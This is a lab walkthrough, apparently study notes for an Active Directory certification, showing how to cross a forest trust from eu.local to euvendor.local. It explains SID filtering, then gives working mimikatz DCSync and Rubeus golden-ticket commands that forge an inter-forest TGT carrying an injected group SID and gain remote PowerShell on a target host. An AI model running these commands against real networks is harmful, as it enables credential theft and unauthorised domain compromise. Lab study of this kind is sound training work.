# 1. Rights, Privileges and Permissions of `eu\Administrator`
- Since we have no access to a domain user of `euvendor.local` and there are no other accounts we could attempt to compromise (e.g via Kerberoasting) we will have to rely on our current access to try to access resources on the domain.
## 1.1 Access Rights
- We can use **SharpShares** to enumerate for access in file shares on `euvendor.local`.
```powershell

- We have RW access to `eushare` at `EUVENDOR-DC`. Let's see if there are any interesting files in there.
```powershell
PS C:\Windows\Tasks> dir \\EUVENDOR-DC.EUVENDOR.LOCAL\eushare
dir \\EUVENDOR-DC.EUVENDOR.LOCAL\eushare


    Directory: \\EUVENDOR-DC.EUVENDOR.LOCAL\eushare

PS C:\Windows\Tasks> type \\EUVENDOR-DC.EUVENDOR.LOCAL\eushare\shared.txt
type \\EUVENDOR-DC.EUVENDOR.LOCAL\eushare\shared.txt
Shared with Domain Admins of eu.local
```
- It seems that members of the Domain Admins of `eu.local` have access to some resources of `euvendor.local`. Let's see if we can remotely access any of the target domain's computers with the user we have currently impersonated.
```powershell
PS C:\Windows\Tasks> winrs -r:euvendor-dc.euvendor.local powershell
winrs -r:euvendor-dc.euvendor.local powershell


Winrs error:Access is denied.PS C:\Windows\Tasks>

PS C:\Windows\Tasks> winrs -r:euvendor-net.euvendor.local powershell
winrs -r:euvendor-net.euvendor.local powershell


Winrs error:PS C:\Windows\Tasks> Access is denied.
```
## 1.2 Account Privileges
- `eu\Administrator` does not have any interesting privileges on `euvendor.local`.
## 1.3 Account Permissions
- `eu\Administrator` does not have any interesting permissions on `euvendor.local`.
# 2. Forge an Inter-Forest TGT to partially access resources on the target domain
- Our only option now is to try to abuse the bidirectional trust flow between the `eu.local` and `euvendor.local` forests in an attemt to access resources across the forest boundary. We can use the Trust Key, the same way as in Domain trusts but we can access only those resources which are explicitly shared with our current forest.
- It is very important to notice that we will not be able to access all resources at `euvendor.local` by abusing the Trust Key to forge an Inter-Forest TGT because _SID Filtering_ is enabled, as we saw in [[2. Lab Walkthrough/1st Forest (techcorp.local)/1. us.techcorp.local/1. Domain Enumeration|1. Domain Enumeration]].
**SID**
- The **SID (Security Identifier)** is a unique identifier that is assigned to each security principal (e.g. user, group, computer). It is used to identify the principal within the domain and is used to control access to resources.
**SID history**
- The **SID history** is a property of a user or group object that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.
- This mechanism can also be abused as a means of persistence: adding the SID of a privileged account or group to the SID-History attribute of a controlled account grants rights associated with account/group of which the SID is added.
- For instance, the SID of an account with Domain Admin rights can be added to a normal user SID History to grant them Domain Admin rights (the rights would not be granted per say, but the modified account would be treated as domain admin when checking rights).
**SID Filtering**
- According to Microsoft, the security boundary in Active Directory is the forest, not the domain. The forest defines the boundaries of trust and controls access to resources within the forest.
- SID filtering plays an important role in the security boundary by making sure "only SIDs from the trusted domain will be accepted for authorization data returned during authentication. SIDs from other domains will be removed" (`netdom` cmdlet output). By default, SID filtering is disabled for intra-forest trusts, and enabled for inter-forest trusts.
	- if SID filtering is fully enabled, all SIDs that differ from the trusted domain will be filtered out
	- even if it's enabled, a few SIDs will (almost) never be filtered: "Enterprise Domain Controllers" (S-1-5-9) SID and those described by the [trusted domain object (TDO)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4), as well as seven well-known SIDs (see [MS-PAC doc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280), and [improsec's blogpost](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained#yui_3_17_2_1_1673614140169_543)).
	- there are two kinds of inter-forest trusts: "Forest", and "External" (see [trust types](/ad/movement/trusts#trust-types)). Microsoft says "[cross-forest trusts are more stringently filtered than external trusts](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)", meaning that in External trusts, SID filtering only filters out RID < 1000.
- The SID filtering status of a trust depends on the [trustAttributes](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c) flags of a [TDO](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4) as well as the type of trust.
	- If the `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN (0x00000004)` flag is set, then only SIDs from the trusted domain are allowed (all others are filtered)
	- If the `TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL (0x00000040)` flag is set, then inter-forest ticket can be forged, spoofing an RID >= 1000. Of course, this doesn't apply if TAQD (`TRUST_ATTRIBUTE_QUARANTINED_DOMAIN`) is set.
- If we go back at our enumeration phase, we can see the following:
```
SourceName      : euvendor.local
TargetName      : eu.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
TrustDirection  : Bidirectional
```
- This means that we can forge an Inter-Forest TGT by abusing the Trust Key but then again, we will be able to access only specific resources. For example we will not be able to inject the SID of the Domain Admins or Enterprise Admins of `euvendor.local` in our forged ticket, because SID Filtering dictates that SIDs<1000 will be automatically discarded. Since we have found an interesting domain group, EUAdmins, we could inject its SID to our forged ticket in order to be able to access the resources that this group is allowed to.
- First we need to obtain the RC4 of the Trust Key `eu\euvendor$`.
```powershell
mimikatz # lsadump::dcsync /user:euvendor$ /domain:eu.local /dc:eu-dc.eu.local
[DC] 'eu.local' will be the domain

```
- Then, using **Rubeus**, we will create the Inter-Forest TGT injecting the SID of EUAdmins domain group.
```powershell
PS C:\Windows\Tasks> .\Rubeus.exe golden /rc4:a1f7ae6e6ce21b2e0fbaf3f44e67d42f /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009-500 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /user:Administrator /service:krbtgt /target:euvendor.local /nowrap
.\Rubeus.exe golden /rc4:a1f7ae6e6ce21b2e0fbaf3f44e67d42f /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009-500 /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /user:Administrator /service:krbtgt /target:euvendor.local /nowrap

<snip>
```
- We will use the forged TGT and try to request access to various resources. We could assume that members of the EUAdmins could possibly have access rights to specific computers in `euvendor.local`.
```powershell
PS C:\Windows\Tasks> .\Rubeus.exe asktgs /user:Administrator /domain:euvendor.local /dc:euvendor-dc.euvendor.local /service:http/euvendor-net.euvendor.local /ptt /ticket:doIFczCCBW+gAwIB...
```
- We can now check if we can access `EUVENDOR-NET`.
```powershell
PS C:\Windows\Tasks> winrs -r:euvendor-net.euvendor.local powershell
winrs -r:euvendor-net.euvendor.local powershell
Windows PowerShell

The command completed successfully.
```
- We can see that members of the EUAdmins domain group are members of the local administrators group. Although `eu\Administrator` was NOT a member of this domain group as a Foreign Security Principal, we were able to forge an Inter-Forest ticket and inject the SID of that domain group to it, due to lax SID Filtering configuration. That resulted in inheriting the rights, privileges and permissions that this domain group has.
